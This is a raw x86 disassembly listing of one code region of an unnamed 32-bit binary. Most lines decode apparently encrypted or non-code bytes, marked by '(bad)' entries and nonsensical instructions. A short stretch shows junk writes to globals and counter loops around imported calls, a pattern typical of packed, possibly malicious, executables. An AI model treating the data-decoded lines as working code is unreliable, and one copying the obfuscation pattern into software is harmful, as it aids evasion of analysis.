  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	mov    ebp,0xb021b217
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	lds    esp,FWORD PTR [ecx]
  40d346:	fidivr WORD PTR [eax-0x1b]
  40d349:	cli    
  40d34a:	js     0x40d386
  40d34c:	cld    
  40d34d:	jno    0x40d375
  40d34f:	xor    DWORD PTR [edx-0x33],edi
  40d352:	xchg   bh,ch
  40d354:	dec    edi
  40d355:	jl     0x40d378
  40d357:	aam    0xbd
  40d359:	xchg   edi,eax
  40d35a:	stos   BYTE PTR es:[edi],al
  40d35b:	adc    al,0x11
  40d35d:	xlat   BYTE PTR ds:[ebx]
  40d35e:	sub    dh,ah
  40d360:	mov    bh,0xa3
  40d362:	push   edi
  40d363:	mov    edx,0xc1547d15
  40d368:	(bad)  
  40d369:	(bad)  
  40d36a:	mov    dl,0xc3
  40d36c:	shr    DWORD PTR [eax+edx*2],cl
  40d36f:	xchg   esp,eax
  40d370:	call   0x4b76:0xb01b132d
  40d377:	je     0x40d3ec
  40d379:	je     0x40d387
  40d37b:	imul   ebx,esp,0xffffffb9
  40d37e:	stos   BYTE PTR es:[edi],al
  40d37f:	fisttp QWORD PTR [eax-0x1b]
  40d382:	fild   QWORD PTR [eax-0x70]
  40d385:	clc    
  40d386:	sbb    cl,BYTE PTR [esi-0x8bd57c2]
  40d38c:	mov    esi,0x46865b32
  40d391:	mov    ds:0xce745a3a,al
  40d396:	in     al,dx
  40d397:	or     edi,DWORD PTR [ebx+0x3f7f0c7]
  40d39d:	mov    esi,0xc08719f7
  40d3a2:	or     ah,BYTE PTR [esi+0x157493d]
  40d3a8:	xor    edi,eax
  40d3aa:	add    ah,BYTE PTR ds:0x14fef25c
  40d3b0:	xor    DWORD PTR [ebp*8-0x177f3234],ecx
  40d3b7:	mov    ebx,0x40f05941
  40d3bc:	retf   0xd667
  40d3bf:	std    
  40d3c0:	pusha  
  40d3c1:	stos   DWORD PTR es:[edi],eax
  40d3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c4:	clc    
  40d3c5:	ret    0x4cd2
  40d3c8:	idiv   BYTE PTR [ebx]
  40d3ca:	adc    DWORD PTR [edx-0x20],0x16
  40d3ce:	call   0xe270:0xb5a0e73c
  40d3d5:	imul   esp,edi,0xfffffffb
  40d3d8:	ja     0x40d393
  40d3da:	retf   
  40d3db:	or     al,0xd3
  40d3dd:	jns    0x40d396
  40d3df:	jg     0x40d427
  40d3e1:	pop    edi
  40d3e2:	xchg   edx,eax
  40d3e3:	ins    BYTE PTR es:[edi],dx
  40d3e4:	pop    ecx
  40d3e5:	xchg   ecx,eax
  40d3e6:	jmp    0x40d43a
  40d3e8:	pextrw edi,(bad),0xc5
  40d3ea:	mov    ebx,0x52ce51d6
  40d3ef:	test   al,0x86
  40d3f1:	jae    0x40d390
  40d3f3:	adc    eax,0x3060bc77
  40d3f8:	jecxz  0x40d419
  40d3fa:	shr    DWORD PTR [edx+eax*8-0x51],cl
  40d3fe:	cwde   
  40d3ff:	inc    esi
  40d400:	mov    ah,0xea
  40d402:	push   ebx
  40d403:	dec    edi
  40d404:	mov    eax,ds:0xd9bea6c1
  40d409:	sbb    BYTE PTR [ebx+0x7ecec4b],ah
  40d40f:	cmp    BYTE PTR [eax-0x7a],dl
  40d412:	adc    al,0xbd
  40d414:	xchg   esp,eax
  40d415:	(bad)  
  40d416:	fxch   st(3)
  40d418:	pop    edi
  40d419:	add    edi,DWORD PTR [ebx]
  40d41b:	int3   
  40d41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d41d:	sar    esi,0x71
  40d420:	pop    esi
  40d421:	popa   
  40d422:	dec    ecx
  40d423:	inc    ecx
  40d424:	xor    ebp,ebx
  40d426:	push   edi
  40d427:	adc    al,0x48
  40d429:	lahf   
  40d42a:	xchg   ah,cl
  40d42c:	xor    dh,BYTE PTR [ebp+0x4b5b253b]
  40d432:	push   0xba2147c0
  40d437:	mov    cl,0x37
  40d439:	jno    0x40d48d
  40d43b:	or     eax,0xc1e1d9c4
  40d440:	push   eax
  40d441:	mov    ebp,0x4898576c
  40d446:	jecxz  0x40d432
  40d448:	xchg   edi,eax
  40d449:	in     al,0x87
  40d44b:	push   edx
  40d44c:	imul   dh
  40d44e:	out    0x3e,al
  40d450:	push   es
  40d451:	mov    bh,0x61
  40d453:	jecxz  0x40d4b6
  40d455:	adc    esp,DWORD PTR [edx-0x75]
  40d458:	add    DWORD PTR [edx+0x30],esp
  40d45b:	jo     0x40d48f
  40d45d:	(bad)  
  40d45e:	(bad)  
  40d460:	xor    esp,DWORD PTR [edi-0x29]
  40d463:	jo     0x40d483
  40d465:	cmp    al,0x9d
  40d467:	popa   
  40d468:	push   ss
  40d469:	aaa    
  40d46a:	cmp    eax,0xc8c77f04
  40d46f:	(bad)  
  40d470:	hlt    
  40d471:	xchg   edi,eax
  40d473:	jmp    0x40d43e
  40d475:	cmp    ebp,eax
  40d477:	cmp    eax,0xf7cce9a8
  40d47c:	dec    eax
  40d47d:	push   esp
  40d47e:	sub    esp,DWORD PTR [ebx-0x4fa83eed]
  40d484:	push   ebx
  40d485:	push   cs
  40d486:	data16 cmp BYTE PTR ds:0x23ce396,0xe0
  40d48e:	inc    ebx
  40d48f:	in     al,dx
  40d490:	fisttp DWORD PTR [ebp+0x52]
  40d493:	cmp    al,0x6
  40d495:	push   0xa3a1b083
  40d49a:	dec    eax
  40d49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d49c:	or     eax,0x3a0c003
  40d4a1:	mov    edx,0x5d182c5b
  40d4a6:	push   edx
  40d4a7:	out    dx,eax
  40d4a8:	stos   BYTE PTR es:[edi],al
  40d4a9:	or     DWORD PTR [ebx+0x7d],0xffffffd3
  40d4ad:	mov    esp,0x6c20fc0
  40d4b2:	pop    esp
  40d4b3:	pop    ebp
  40d4b4:	mov    WORD PTR ds:0x86f8e945,?
  40d4ba:	xor    bh,BYTE PTR [edi]
  40d4bc:	psubq  mm6,QWORD PTR [eax-0x7b8e16f1]
  40d4c3:	add    ecx,DWORD PTR [ecx-0x3f18c94]
  40d4c9:	aad    0xa
  40d4cb:	mov    ds:0x52a5e3ae,eax
  40d4d0:	push   ebx
  40d4d1:	sti    
  40d4d2:	add    eax,0x4cd1cb74
  40d4d7:	jb     0x40d482
  40d4d9:	mov    al,0x77
  40d4db:	dec    edi
  40d4dc:	and    edx,DWORD PTR [edx-0x4d]
  40d4df:	jg     0x40d535
  40d4e1:	mov    ds:0xc898abc4,al
  40d4e6:	loopne 0x40d558
  40d4e8:	shl    BYTE PTR [eax-0x2e9dc8aa],0x9e
  40d4ef:	push   0xffffffda
  40d4f1:	push   0xea781406
  40d4f6:	ins    DWORD PTR es:[edi],dx
  40d4f7:	push   esi
  40d4f8:	jl     0x40d488
  40d4fa:	(bad)
  40d4ff:	outs   dx,BYTE PTR ds:[esi]
  40d500:	repz sbb eax,0xbc2a7595
  40d506:	mov    ds:0x9ed9039e,al
  40d50b:	push   ss
  40d50c:	or     eax,0x5be3e415
  40d511:	int    0x74
  40d513:	test   BYTE PTR [edi+esi*4+0xb],al
  40d517:	shl    dl,0x40
  40d51a:	into   
  40d51b:	sub    eax,0xd4877d23
  40d520:	dec    esp
  40d521:	mov    ds:0x638aebb,al
  40d526:	adc    eax,0xebd358a9
  40d52b:	pop    eax
  40d52c:	stc    
  40d52d:	scas   al,BYTE PTR es:[edi]
  40d52e:	fisttp WORD PTR [ecx-0x66f9f9ed]
  40d534:	test   BYTE PTR [ecx+0x2c],0x8e
  40d538:	stc    
  40d539:	sub    DWORD PTR ds:0x8d34ac38,edi
  40d53f:	inc    eax
  40d540:	sbb    cl,BYTE PTR [edi]
  40d542:	fs push 0x72e6bb9
  40d548:	out    dx,al
  40d549:	mov    eax,ds:0x20dc3fdc
  40d54e:	and    DWORD PTR [edx],edx
  40d550:	mov    bh,0x3c
  40d552:	xchg   edi,eax
  40d553:	stos   DWORD PTR es:[edi],eax
  40d554:	mov    edi,0x9fb4255d
  40d559:	jne    0x40d5d3
  40d55b:	push   esp
  40d55c:	and    al,0x54
  40d55e:	mov    WORD PTR [ecx-0x62],ds
  40d561:	push   cs
  40d562:	xor    ah,ah
  40d564:	or     al,0x43
  40d566:	push   esp
  40d567:	je     0x40d54d
  40d569:	scas   eax,DWORD PTR es:[edi]
  40d56a:	add    esi,DWORD PTR [edx-0xd]
  40d56d:	mov    al,0x4f
  40d56f:	or     al,0xc6
  40d571:	mov    WORD PTR [ebx+0x8],gs
  40d574:	jb     0x40d570
  40d576:	sub    BYTE PTR [eax],bl
  40d578:	xchg   edx,eax
  40d579:	inc    esi
  40d57a:	out    0xb3,eax
  40d57c:	in     al,0x2c
  40d57e:	add    eax,0x14c742ee
  40d583:	into   
  40d584:	cmp    al,0xd2
  40d586:	push   ds
  40d587:	dec    edi
  40d588:	push   ebx
  40d589:	add    al,BYTE PTR [ebx+0x3]
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433823,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433817,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43381b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433827,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433863
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43381b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4338a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4338af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4337db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43385b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433897,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433897
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433897,edx
  40d64f:	cmp    DWORD PTR ds:0x433897,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433897,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4337e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4337e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4337e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4337e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4338d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4337e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4337e7
  40d6b7:	add    eax,DWORD PTR ds:0x43381b
  40d6bd:	mov    ds:0x4337e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x8fa0482a
  40d6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6fa:	or     eax,edx
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6d1
  40d705:	fs xchg edi,eax
  40d707:	cli    
  40d708:	sbb    cl,BYTE PTR [esi+0x6d919d30]
  40d70e:	stos   BYTE PTR es:[edi],al
  40d70f:	iret   
  40d710:	mov    edx,0x3f0bf3ed
  40d716:	add    eax,0xa1cf6105
  40d71b:	mov    al,0xce
  40d71d:	xor    al,0x97
  40d71f:	push   eax
  40d720:	mov    esp,0x8f19dba5
  40d725:	sbb    bl,cl
  40d727:	or     BYTE PTR [ebx+0x4b],0xbc
  40d72b:	rol    esp,cl
  40d72d:	dec    esp
  40d72e:	ffreep st(3)
  40d730:	ret    0xb6d
  40d733:	adc    dl,BYTE PTR [edi]
  40d735:	push   esi
  40d736:	or     DWORD PTR [edx+0x40],edi
  40d739:	mov    edx,0x2ccd941e
  40d73e:	sahf   
  40d73f:	cmp    al,0x5b
  40d741:	or     BYTE PTR [ebp-0x44],0xeb
  40d745:	adc    eax,0x5347845c
  40d74a:	sub    eax,esi
  40d74c:	xchg   ch,bl
  40d74e:	add    al,0x57
  40d750:	xor    DWORD PTR [ebx+0x16],ebp
  40d753:	jb     0x40d735
  40d755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d756:	test   eax,0xaca969df
  40d75b:	jbe    0x40d6de
  40d75d:	sbb    esi,ebp
  40d75f:	xor    esi,ecx
  40d761:	fs int3 
  40d763:	in     al,dx
  40d764:	dec    edi
  40d765:	add    edx,DWORD PTR [edx+0x7131607a]
  40d76b:	cmp    eax,0xd9b6d1c4
  40d770:	xchg   DWORD PTR [ebx+0x7d],edi
  40d773:	sti    
  40d774:	(bad)  
  40d775:	sbb    bh,BYTE PTR fs:[ebp-0x61]
  40d779:	imul   edi,DWORD PTR fs:[edi],0x74
  40d77d:	mov    al,ds:0xfcde6864
  40d782:	sub    BYTE PTR [edi+0x6a938dfb],0x1c
  40d789:	rcr    BYTE PTR [ebx-0x5f],cl
  40d78c:	shl    BYTE PTR [ebx-0x4b],0xf6
  40d790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d791:	test   BYTE PTR [ebx+eiz*1-0x3b],bl
  40d795:	pop    edi
  40d796:	mov    dl,0xfa
  40d798:	fsubr  QWORD PTR [ebx+0x6124e147]
  40d79e:	or     bl,BYTE PTR [esi]
  40d7a0:	ja     0x40d7e7
  40d7a2:	or     al,0x3e
  40d7a4:	cmp    BYTE PTR [ebx-0x4ea18d46],dl
  40d7aa:	ins    BYTE PTR es:[edi],dx
  40d7ab:	das    
  40d7ac:	push   eax
  40d7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ae:	mov    cl,0xa1
  40d7b0:	nop
  40d7b1:	inc    ebx
  40d7b2:	loop   0x40d7a9
  40d7b4:	jno    0x40d7f5
  40d7b6:	pop    ebx
  40d7b7:	dec    esp
  40d7b8:	mov    es,esi
  40d7ba:	mov    bh,0x62
  40d7bc:	ficomp DWORD PTR [esi-0x51]
  40d7bf:	test   DWORD PTR [eax-0x5c],0xe659ba86
  40d7c6:	fucomi st,st(1)
  40d7c8:	ins    DWORD PTR es:[edi],dx
  40d7c9:	jl     0x40d768
  40d7cb:	xchg   ebp,eax
  40d7cc:	repz pop ebx
  40d7ce:	add    eax,DWORD PTR [edi+0x45]
  40d7d1:	cmp    eax,0xb56bb48e
  40d7d6:	fwait
  40d7d7:	fwait
  40d7d8:	xor    bh,BYTE PTR [edx-0x856e9e]
  40d7de:	out    dx,eax
  40d7df:	jecxz  0x40d7c2
  40d7e1:	test   DWORD PTR [ebp+0x31],ecx
  40d7e4:	push   ds
  40d7e5:	mov    ch,0x73
  40d7e7:	hlt    
  40d7e8:	pop    ebx
  40d7e9:	mov    BYTE PTR [ebx],0xb6
  40d7ec:	jb     0x40d829
  40d7ee:	push   edx
  40d7ef:	pop    es
  40d7f0:	jbe    0x40d83f
  40d7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7f3:	cmp    BYTE PTR [edi+0x14],al
  40d7f6:	push   eax
  40d7f7:	js     0x40d7ad
  40d7f9:	call   0xb6eee544
  40d7fe:	fmul   st,st(2)
  40d800:	mov    edx,db0
  40d803:	mov    eax,0xaf9f0c5f
  40d808:	out    dx,al
  40d809:	jmp    0x40d7df
  40d80b:	data16 rcr BYTE PTR [edi+0x11],1
  40d80f:	mov    BYTE PTR [edi-0x26],al
  40d812:	shr    BYTE PTR ds:0xe5f907ea,1
  40d818:	sbb    ebx,DWORD PTR [edx+0x32b2f0ed]
  40d81e:	jl     0x40d83f
  40d820:	loopne 0x40d7a4
  40d822:	pusha  
  40d823:	fsubr  DWORD PTR [edx+0x48]
  40d826:	mov    ds:0x78a47d83,eax
  40d82b:	(bad)
  40d82e:	inc    esi
  40d82f:	mov    eax,ds:0x89963a24
  40d834:	or     al,0x52
  40d836:	push   esi
  40d837:	call   0x1bbd6eb0
  40d83c:	push   ecx
  40d83d:	push   0xffffffbf
  40d83f:	cmp    ah,BYTE PTR [ecx-0x35]
  40d842:	popa   
  40d843:	sub    al,0x36
  40d845:	out    dx,al
  40d846:	jne    0x40d80c
  40d848:	mov    eax,ds:0x73582309
  40d84d:	mov    ah,cl
  40d84f:	xor    cl,ch
  40d851:	dec    ebx
  40d852:	(bad)  
  40d853:	js     0x40d874
  40d855:	test   eax,0x494e605f
  40d85a:	(bad)  
  40d85b:	retf   
  40d85c:	jb     0x40d887
  40d85e:	or     DWORD PTR fs:[esi-0x12],esp
  40d862:	pushf  
  40d863:	and    BYTE PTR [esi-0x29506967],dl
  40d869:	test   eax,0x85449727
  40d86e:	(bad)  
  40d86f:	repz or edi,ebp
  40d872:	out    dx,eax
  40d873:	jge    0x40d8b2
  40d875:	lods   al,BYTE PTR ds:[esi]
  40d876:	neg    bh
  40d878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d879:	ja     0x40d834
  40d87b:	inc    ebx
  40d87c:	out    dx,al
  40d87d:	sub    al,0x19
  40d87f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d880:	sub    DWORD PTR [ebx],esi
  40d882:	xchg   edx,eax
  40d883:	inc    ebx
  40d884:	inc    BYTE PTR [ecx-0x7eaab8e6]
  40d88a:	mov    cl,0x38
  40d88c:	call   0x292585ac
  40d891:	(bad)  
  40d892:	mov    ebp,0xf251c693
  40d897:	push   es
  40d898:	repnz call 0x4e8f:0x95432898
  40d8a0:	cwde   
  40d8a1:	loop   0x40d8e8
  40d8a3:	jb     0x40d89b
  40d8a5:	inc    eax
  40d8a6:	repz push esp
  40d8a8:	inc    eax
  40d8a9:	xor    al,0x47
  40d8ab:	mov    ah,0x9e
  40d8ad:	cs inc edi
  40d8af:	retf   
  40d8b0:	cmp    al,0x49
  40d8b2:	xchg   edi,eax
  40d8b3:	xchg   ecx,eax
  40d8b4:	xor    ecx,esp
  40d8b6:	cdq    
  40d8b7:	aas    
  40d8b8:	pop    ecx
  40d8b9:	sbb    DWORD PTR [esi],edx
  40d8bb:	jno    0x40d92a
  40d8bd:	cli    
  40d8be:	mov    edi,gs
  40d8c0:	enter  0x3e0b,0x82
  40d8c4:	add    cl,dh
  40d8c6:	sbb    ebx,DWORD PTR [edx-0x29]
  40d8c9:	add    DWORD PTR [esi-0x1],edi
  40d8cc:	or     al,0xad
  40d8ce:	enter  0xe200,0x47
  40d8d2:	(bad)  
  40d8d3:	sbb    eax,0x861114f2
  40d8d8:	sti    
  40d8d9:	div    DWORD PTR [ebp-0x5a]
  40d8dc:	sub    al,BYTE PTR [edx]
  40d8de:	lahf   
  40d8df:	inc    ebx
  40d8e0:	xlat   BYTE PTR ds:[ebx]
  40d8e1:	and    eax,0xa18f140f
  40d8e6:	push   es
  40d8e7:	(bad)  
  40d8e8:	jno    0x40d88c
  40d8ea:	test   eax,0xee08908
  40d8ef:	add    ebx,edi
  40d8f1:	mov    BYTE PTR [ecx],ah
  40d8f3:	out    0xf5,al
  40d8f5:	xchg   esi,eax
  40d8f6:	shr    BYTE PTR [edx+0x14],cl
  40d8f9:	adc    dl,ch
  40d8fb:	sub    eax,eax
  40d8fd:	leave  
  40d8fe:	add    ah,BYTE PTR [esi-0x12]
  40d901:	lock in eax,0x64
  40d904:	xor    dl,BYTE PTR [esi-0x3db5583a]
  40d90a:	mov    edx,0xee597c60
  40d90f:	mov    ?,ebx
  40d911:	clc    
  40d912:	xlat   BYTE PTR ds:[ebx]
  40d913:	dec    edx
  40d914:	daa    
  40d915:	(bad)  
  40d916:	pop    ebp
  40d917:	mov    DWORD PTR ds:0x45be10a0,ebp
  40d91d:	push   eax
  40d91e:	cmp    BYTE PTR [esp+ebx*1],ah
  40d921:	call   0xe349:0x85eba1f2
  40d928:	fstp   DWORD PTR [eax]
  40d92a:	sbb    eax,0x9905b751
  40d92f:	mov    ds:0x3ba6be9,eax
  40d934:	clc    
  40d935:	or     eax,0x8cf1cc4a
  40d93a:	lds    ebx,FWORD PTR [edi]
  40d93c:	in     eax,dx
  40d93d:	mov    ebp,0xc4f2d794
  40d942:	inc    ebx
  40d943:	in     al,dx
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x832b51ed
  40d96a:	xor    DWORD PTR [eax],0x1c
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	mov    edx,0x3eedc303
  40d97a:	stos   BYTE PTR es:[edi],al
  40d97b:	ss push eax
  40d97d:	inc    sp
  40d97f:	mov    WORD PTR [ebx+0x4990eb6f],ss
  40d985:	lock jp 0x40d9e5
  40d988:	daa    
  40d989:	aaa    
  40d98a:	loopne 0x40d98a
  40d98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d98d:	outs   dx,DWORD PTR ds:[esi]
  40d98e:	jecxz  0x40d9d4
  40d990:	add    dh,ah
  40d992:	inc    edi
  40d993:	das    
  40d994:	adc    BYTE PTR [esp+ecx*2],dh
  40d997:	out    0x9a,al
  40d999:	xor    BYTE PTR [edx],dl
  40d99b:	test   BYTE PTR [edx+0x3f],ch
  40d99e:	pop    eax
  40d99f:	outs   dx,BYTE PTR ds:[esi]
  40d9a0:	std    
  40d9a1:	aas    
  40d9a2:	not    DWORD PTR [esi+0x723030f5]
  40d9a8:	pop    ebp
  40d9a9:	adc    cl,BYTE PTR gs:[edx+0x41]
  40d9ad:	push   ss
  40d9ae:	repz inc ebx
  40d9b0:	xchg   ecx,eax
  40d9b1:	inc    esi
  40d9b2:	or     al,0x79
  40d9b4:	icebp  
  40d9b5:	nop
  40d9b6:	inc    esp
  40d9b7:	and    ecx,ebp
  40d9b9:	(bad)  
  40d9ba:	jns    0x40d99a
  40d9bc:	hlt    
  40d9bd:	arpl   ax,si
  40d9bf:	rcl    dh,cl
  40d9c1:	rcl    ch,0x3d
  40d9c4:	dec    edx
  40d9c5:	pusha  
  40d9c6:	mov    bh,0x4c
  40d9c8:	popf   
  40d9c9:	cwde   
  40d9ca:	xlat   BYTE PTR ds:[ebx]
  40d9cb:	fwait
  40d9cc:	ror    BYTE PTR [eax+0x637691a6],0x5f
  40d9d3:	xchg   edi,eax
  40d9d4:	adc    edi,esp
  40d9d6:	into   
  40d9d7:	stc    
  40d9d8:	mov    ebx,0xb288d805
  40d9dd:	mov    bh,0x6f
  40d9df:	loopne 0x40da5d
  40d9e1:	into   
  40d9e2:	das    
  40d9e3:	push   eax
  40d9e4:	mov    esi,0xccb40d50
  40d9e9:	pop    ebx
  40d9ea:	mov    ecx,0xd6f29f0d
  40d9ef:	leave  
  40d9f0:	ds jo  0x40da43
  40d9f3:	mov    bl,0x8e
  40d9f5:	ins    BYTE PTR es:[edi],dx
  40d9f6:	mov    al,ds:0xbbfb1b9b
  40d9fb:	inc    edx
  40d9fc:	jae    0x40d9e6
  40d9fe:	sub    ebp,DWORD PTR [ecx-0x17c6937f]
  40da04:	mov    edx,0x45647697
  40da09:	pushf  
  40da0a:	inc    edi
  40da0b:	aam    0xec
  40da0d:	arpl   WORD PTR ds:[ebp+0x25e758fd],sp
  40da14:	adc    esi,ebp
  40da16:	mov    eax,ds:0x3269ce4f
  40da1b:	mov    dl,0x48
  40da1d:	retf   
  40da1e:	dec    edi
  40da1f:	inc    esp
  40da20:	cmp    eax,0x334c04e2
  40da25:	loope  0x40da91
  40da27:	out    0x90,al
  40da29:	and    DWORD PTR [ebx+0x2931ca9d],edx
  40da2f:	mov    eax,ds:0x4a63606c
  40da34:	cmp    eax,0x7d19dd93
  40da39:	and    BYTE PTR [ecx-0x38],ch
  40da3c:	fidiv  WORD PTR [ebp+0x62fdc533]
  40da42:	loope  0x40d9fc
  40da44:	or     BYTE PTR [ebx],0xd1
  40da47:	pop    ebx
  40da48:	adc    DWORD PTR [si+0x6df],ecx
  40da4d:	ror    BYTE PTR [edi],cl
  40da4f:	jge    0x40d9d6
  40da51:	pop    es
  40da52:	fist   WORD PTR [edx-0x1f73923]
  40da58:	cs pop ebp
  40da5a:	scas   al,BYTE PTR es:[edi]
  40da5b:	test   BYTE PTR [esp+esi*2+0x4a],ch
  40da5f:	adc    al,0x5
  40da61:	push   ecx
  40da62:	aas    
  40da63:	and    esp,edi
  40da65:	mov    edi,0x6f8ef7bd
  40da6a:	and    BYTE PTR [ecx+0x74],dh
  40da6d:	sub    al,0x69
  40da6f:	xor    eax,esi
  40da71:	clc    
  40da72:	sbb    eax,0xa107171c
  40da77:	and    eax,DWORD PTR [ebp+0x95d088c]
  40da7d:	add    eax,0xd0a31bcd
  40da82:	push   ss
  40da83:	push   es
  40da84:	das    
  40da85:	sbb    al,BYTE PTR [edi+0x13]
  40da88:	in     eax,0x60
  40da8a:	dec    ecx
  40da8b:	shr    bl,1
  40da8d:	pop    ecx
  40da8e:	pop    ds
  40da8f:	fs cli 
  40da91:	retf   
  40da92:	stos   BYTE PTR es:[edi],al
  40da93:	push   ds
  40da94:	std    
  40da95:	cmp    BYTE PTR [edi+ebp*1+0x13d252ac],ch
  40da9c:	jle    0x40da30
  40da9e:	or     ecx,DWORD PTR [eax+ebx*1]
  40daa1:	clc    
  40daa2:	mov    al,ds:0xb4b72c99
  40daa7:	das    
  40daa8:	shl    DWORD PTR [ecx],1
  40daaa:	adc    ch,BYTE PTR [eax+0x7c]
  40daad:	sub    bh,dh
  40daaf:	pop    ebx
  40dab0:	adc    si,WORD PTR [edi+0x64]
  40dab4:	nop
  40dab5:	repz sub bl,cl
  40dab8:	dec    ebp
  40dab9:	mov    dh,0xec
  40dabb:	and    edi,edi
  40dabd:	or     eax,0x44c1f23
  40dac2:	scas   al,BYTE PTR es:[edi]
  40dac3:	adc    bl,BYTE PTR [edx+0x43f5bf9e]
  40dac9:	pop    eax
  40daca:	pop    ebx
  40dacb:	xchg   DWORD PTR [esi-0x4c7c3dd6],ecx
  40dad1:	dec    ebx
  40dad2:	add    al,0x88
  40dad4:	dec    esi
  40dad5:	frstor [ecx-0x523b4208]
  40dadb:	mov    ds:0x7222335e,eax
  40dae0:	daa    
  40dae1:	jecxz  0x40dad6
  40dae3:	adc    al,0xd4
  40dae5:	mov    ebx,0xe1ab9961
  40daea:	xchg   esi,eax
  40daeb:	sar    esi,1
  40daed:	mov    DWORD PTR [ebp-0x56],ebx
  40daf0:	add    eax,DWORD PTR [esp+esi*2]
  40daf3:	into   
  40daf4:	fld    DWORD PTR [edx+0x5e]
  40daf7:	fidiv  DWORD PTR [ebx]
  40daf9:	(bad)  
  40dafb:	mov    ?,WORD PTR [ebx+0x1a]
  40dafe:	jno    0x40db7d
  40db00:	imul   edi,DWORD PTR [ecx-0xc],0xffffff90
  40db04:	pop    esi
  40db05:	mov    dl,0x4
  40db07:	push   edi
  40db08:	push   edi
  40db09:	ins    DWORD PTR es:[edi],dx
  40db0a:	add    ebp,ebx
  40db0c:	push   esp
  40db0d:	ins    DWORD PTR es:[edi],dx
  40db0e:	out    0x78,al
  40db10:	xchg   ebp,eax
  40db11:	pop    eax
  40db12:	push   ds
  40db13:	adc    DWORD PTR [eax],esp
  40db15:	arpl   ax,bp
  40db17:	int3   
  40db18:	mov    dl,0x2c
  40db1a:	xlat   BYTE PTR ds:[ebx]
  40db1b:	pop    edi
  40db1c:	sub    dh,BYTE PTR [edx+edi*1]
  40db1f:	aad    0xb9
